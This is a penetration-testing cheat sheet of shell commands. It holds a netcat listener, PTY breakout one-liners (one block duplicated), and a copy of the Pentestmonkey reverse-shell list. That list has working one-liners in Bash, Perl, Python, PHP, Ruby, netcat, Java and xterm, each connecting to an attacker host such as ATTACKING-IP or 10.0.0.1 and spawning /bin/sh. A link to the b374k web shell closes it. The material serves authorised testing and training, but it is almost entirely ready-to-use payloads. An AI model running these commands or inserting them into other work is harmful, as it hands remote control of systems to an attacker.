# Shells

Netcat Listener

```bash
nc -nlvp 4444
```



Breakout

~~~bash
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
~~~



# Pentestmonkey Reverse Shell Cheat Sheet

Source:

> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet



### Bash

~~~bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
~~~



### PERL

~~~bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

Perl reverse shells:

http://pentestmonkey.net/tools/web-shells/perl-reverse-shell

http://www.plenz.com/reverseshell



### Python

~~~bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

### PHP

> This code assumes that the TCP connection uses file descriptor 3.  This 
> worked on my test system.  If it doesn’t work, try 4, 5, 6…

~~~bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
~~~

### Ruby

~~~bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
~~~

### Netcat

~~~bash
nc -e /bin/sh 10.0.0.1 1234
~~~

If wrong version of netcat installed: **Ippsec recommends this as it works often**
~~~bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
~~~

### Java

~~~bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
~~~

### xterm

One of the simplest forms of reverse shell is an xterm session.  The 
following command should be run on the server.  It will try to connect 
back to you (10.0.0.1) on TCP port 6001.

~~~bash
xterm -display 10.0.0.1:1
~~~
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
~~~bash
Xnest :1
~~~
You’ll need to authorise the target to connect to you (command also run on your host):
~~~bash
xhost +targetip
~~~

## Other shells

b374k web shell

https://github.com/b374k/b374k





